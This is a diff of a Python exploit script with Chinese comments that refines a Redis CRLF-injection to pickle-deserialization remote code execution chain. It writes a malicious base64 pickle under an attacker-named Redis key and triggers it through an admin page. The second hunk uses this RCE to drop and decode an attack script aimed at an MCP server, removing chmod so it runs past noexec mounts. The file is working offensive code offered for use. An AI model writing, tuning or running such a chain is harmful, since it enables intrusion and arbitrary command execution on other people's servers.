@@ -415,24 +415,24 @@ def exploit_pickle_rce(session, redis_config, cmd):
     # 方案1：使用十六进制编码，目标如果有hex解码则可用
     # 方案2：直接base64，假设目标会base64解码后再pickle.loads
     # 这里假设目标应用会对Redis值做base64解码后反序列化
+    # 使用标准base64编码（目标应用使用标准b64decode解码）
     payload_b64 = base64.b64encode(payload).decode()
 
     # 构造Redis SET命令，写入恶意序列化数据
-    # 假设目标应用会读取online_user:xxx键并反序列化
-    redis_key = "online_user:attacker"
+    # 目标应用会读取online-user:xxx键并反序列化
+    redis_key = "online-user:attacker"
 
     # 使用Redis协议格式写入
-    # SET key value 中 value 如果包含空格需要用引号
     commands = [
-        f'SET {redis_key} "{payload_b64}"'
+        f'SET {redis_key} {payload_b64}'
     ]
 
     result = exploit_crlf_redis_command(session, redis_config, commands)
 
     # 触发反序列化（访问在线用户页面）
-    # 目标应用的/admin/online_users会遍历online_user:*键并反序列化
+    # 目标应用的/admin/online-users会遍历online-user:*键并反序列化
     try:
-        session.get(f"{TARGET_URL}/admin/online_users", timeout=10)
+        session.get(f"{TARGET_URL}/admin/online-users", timeout=10)
     except Exception:
         pass
 
@@ -504,13 +504,11 @@ def attack_mcp_server(session, redis_config, forged_cookie):
     print("[*] 写入MCP攻击脚本...")
     write_cmd1 = f"echo '{script_b64}' > {SCRIPT_BASE64_FILE}"
     write_cmd2 = f"base64 -d {SCRIPT_BASE64_FILE} > {SCRIPT_FILE}"
-    write_cmd3 = f"chmod +x {SCRIPT_FILE}"
+    # 【修复】移除chmod +x，/tmp可能挂载noexec，直接用python3解释执行无需执行权限
 
     exploit_pickle_rce(session, redis_config, write_cmd1)
     time.sleep(1)
     exploit_pickle_rce(session, redis_config, write_cmd2)
-    time.sleep(1)
-    exploit_pickle_rce(session, redis_config, write_cmd3)
     time.sleep(2)
 
     # 步骤2：执行攻击脚本
